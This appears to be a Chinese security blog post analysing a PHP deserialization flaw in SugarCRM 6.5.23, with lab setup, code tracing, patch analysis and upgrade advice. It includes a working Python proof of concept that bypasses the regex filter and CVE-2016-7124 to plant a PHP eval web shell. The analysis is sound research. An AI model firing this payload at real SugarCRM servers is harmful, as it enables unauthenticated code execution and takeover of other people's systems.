---
layout: post
title: SugarCRM v6.5.23 PHP反序列化对象注入漏洞
---

## 0x00 漏洞概述

### 1.漏洞简介

[SugarCRM](http://www.sugarcrm.com/)是一套开源的客户关系管理系统。近期研究者发现在其<=6.5.23的版本中存在反序列化漏洞，程序对攻击者恶意构造的序列化数据进行了反序列化的处理，从而使攻击者可以在未授权状态下执行任意代码。

### 2.漏洞影响

未授权状态下任意代码执行

### 3.影响版本

SugarCRM <= 6.5.23

PHP5 < 5.6.25

PHP7 < 7.0.10

## 0x01 漏洞复现

### 1. 环境搭建

Dockerfile:

```dockerfile
FROM php:5.6-apache

# Install php extensions
RUN echo "deb http://mirrors.163.com/debian/ jessie main non-free contrib" > /etc/apt/sources.list \
    && echo "deb http://mirrors.163.com/debian/ jessie-updates main non-free contrib" >> /etc/apt/sources.list \

RUN apt-get update \
    && apt-get install -y libpng12-dev libjpeg-dev wget \
    && docker-php-ext-configure gd --with-png-dir=/usr --with-jpeg-dir=/usr \
    && docker-php-ext-install -j$(nproc) mysqli gd zip


# Download and Extract SugarCRM
RUN wget https://codeload.github.com/sugarcrm/sugarcrm_dev/tar.gz/6.5.23 -O src.tar.gz \
	&& tar -zxvf src.tar.gz \
	&& mv sugarcrm_dev-6.5.23/* /var/www/html \
	&& rm src.tar.gz
```

```bash
docker build -t sugarcrm .
docker run -p 80:80 sugarcrm
```

### 2.基础准备

PHP之前爆出了一个漏洞（[CVE-2016-7124](https://bugs.php.net/bug.php?id=72663)），简单来说就是当序列化字符串中**表示对象属性个数的值**大于**真实的属性个数**时会跳过`__wakeup`的执行。Demo如下：

```php?start_line=1
<?php
class Student{
    private $full_name = '';
    private $score = 0;
    private $grades = array();

    public function __construct($full_name, $score, $grades)
    {
        $this->full_name = $full_name;
        $this->grades = $grades;
        $this->score = $score;
    }

    function __destruct()
    {
        var_dump($this);
    }

    function __wakeup()
    {
        foreach(get_object_vars($this) as $k => $v) {
            $this->$k = null;
        }
        echo "Waking up...\n";
    }
}

// $s = new Student('p0wd3r', 123, array('a' => 90, 'b' => 100));
// file_put_contents('1.data', serialize($s));
$a = unserialize(file_get_contents('1.data'));

?>

```

Demo中在`__wakeup`中清除了对象属性，然后在`__destruct`中将对象信息dump出来。正常情况下，序列化得到的1.data是这样的：

```
O:7:"Student":3:{s:18:"Studentfull_name";s:6:"p0wd3r";s:14:"Studentscore";i:123;s:15:"Studentgrades";a:2:{s:1:"a";i:90;s:1:"b";i:100;}}
```

我们执行该脚本，结果如下：

![Alt text](/images/2016-09-12-common.png)

可以看到对象属性已经被清除了。

下面我们将1.data改成下面这个样子（将上面的3变成5或者其他大于3的数字）：

```
O:7:"Student":5:{s:18:"Studentfull_name";s:6:"p0wd3r";s:14:"Studentscore";i:123;s:15:"Studentgrades";a:2:{s:1:"a";i:90;s:1:"b";i:100;}}
```

再执行脚本看看：

![Alt text](/images/2016-09-12-bug.png)

可以看到对象被dump出来了并且属性没有被清除，证明`__wakeup`并没有被执行。

这个漏洞很有趣，在下面的分析中我们会用到它。

### 3.漏洞分析

首先我们看`service/core/REST/SugarRestSerialize.php`中的`serve`函数：

```php?start_inline=1
function serve(){
	$GLOBALS['log']->info('Begin: SugarRestSerialize->serve');
	$data = !empty($_REQUEST['rest_data'])? $_REQUEST['rest_data']: '';
	if(empty($_REQUEST['method']) || !method_exists($this->implementation, $_REQUEST['method'])){
		...
	}else{
		$method = $_REQUEST['method'];
		$data = sugar_unserialize(from_html($data));
		...
	}
}
```

可以看到我们可控的`$_REQUEST['rest_data']`首先通过`from_html`将数据中HTML实体编码的部分解码，然后传入了`sugar_unserialize`函数。

跟进`sugar_unserialize`函数，在`include/utils.php`第5033-5048行：

```php?start_inline=1
/**
 * Performs unserialization. Accepts all types except Objects
 *
 * @param string $value Serialized value of any type except Object
 * @return mixed False if Object, converted value for other cases
 */
function sugar_unserialize($value)
{
    preg_match('/[oc]:\d+:/i', $value, $matches);

    if (count($matches)) {
        return false;
    }

    return unserialize($value);
}
```

从注释中可以看到该函数设计的初衷是为了不让`Object`类型被反序列化，然而正则不够严谨，我们可以在对象长度前加一个`+`号，即`o:14 -> o:+14`，即可绕过这层检测，从而使得我们可控的数据传入`unserialize`函数。

可控点找到了，接下来我们需要寻找有哪些对象可以利用，在`include/SugarCache/SugarCacheFile.php`中第90-108行：

```php?start_inline=1
public function __destruct()
{
    parent::__destruct();

    if ( $this->_cacheChanged )
        sugar_file_put_contents(sugar_cached($this->_cacheFileName), serialize($this->_localStore));
}

/**
* This is needed to prevent unserialize vulnerability
*/
public function __wakeup()
{
	// clean all properties
    foreach(get_object_vars($this) as $k => $v) {
        $this->$k = null;
    }
    throw new Exception("Not a serializable object");
}
```

我们看到了我们比较喜欢的magic方法，并且在`__destruct`中使用对象属性作为参数调用了`sugar_file_put_contents`。

跟进`sugar_file_put_contents`，在`include/utils/sugar_file_utils.php`第131到149行：

```php?start_inline=1
function sugar_file_put_contents($filename, $data, $flags=null, $context=null){
	//check to see if the file exists, if not then use touch to create it.
	if(!file_exists($filename)){
		sugar_touch($filename);
	}

	if ( !is_writable($filename) ) {
	    $GLOBALS['log']->error("File $filename cannot be written to");
	    return false;
	}

	if(empty($flags)) {
		return file_put_contents($filename, $data);
	} elseif(empty($context)) {
		return file_put_contents($filename, $data, $flags);
	} else{
		return file_put_contents($filename, $data, $flags, $context);
	}
}
```

函数并没有对文件内容或者扩展名等进行限制，虽然参数`$data`是`serialize($this->_localStore)`，也就是序列化后的数据，但是我们可以设置`$_this->_localStore`为一个数组，把payload作为数组中的一个值，就可以完整保存payload。

这样如果我们可以传入一个`SugarCacheFile`对象并设置其属性的值，我们就可以写入文件。

然而不巧的是，`__wakeup`会在`__destroy`之前调用，并且我们可以看到在`__wakeup`中对所有对象属性进行了清除。

那么该如何跨过这个限制呢？

想必大家都已经知道了，就是利用我们上面说的PHP的漏洞来跳过`__wakeup`的执行。

最后，整个漏洞的流程如下：

```
$_REQUEST['rest_data'] -> sugar_unserialize -> __destruct -> sugar_file_put_contents -> evil_file
```

PoC Demo如下：

```python
import requests as req

url = 'http://127.0.0.1:8788/service/v4/rest.php'

data = {
    'method': 'login',
    'input_type': 'Serialize',
    'rest_data': 'O:+14:"SugarCacheFile":23:{S:17:"\\00*\\00_cacheFileName";s:15:"../custom/1.php";S:16:"\\00*\\00_cacheChanged";b:1;S:14:"\\00*\\00_localStore";a:1:{i:0;s:29:"<?php eval($_POST[\'HHH\']); ?>";}}',
}

req.post(url, data=data)
```

脚本执行后shell位于custom/1.php：

![Alt text](/images/2016-09-12-shell.png)

### 4.补丁分析

在v6.5.24中，对`sugar_unserialize`进行了如下改进：

```php?start_inline=1
function sugar_unserialize($value)
{
    preg_match('/[oc]:[^:]*\d+:/i', $value, $matches);
    if (count($matches)) {
        return false;
    }
    return unserialize($value);
}
```

更改了正则表达式，使对象类型无法进行反序列化。

## 0x02 修复方案

升级SugarCRM到v6.5.24

升级php5到5.6.25及以上

升级php7到7.0.10及以上

## 0x03 参考

[https://www.exploit-db.com/exploits/40344/](https://www.exploit-db.com/exploits/40344/)

[https://bugs.php.net/bug.php?id=72663](https://bugs.php.net/bug.php?id=72663)

[http://php.net/manual/zh/function.serialize.php](http://php.net/manual/zh/function.serialize.php)
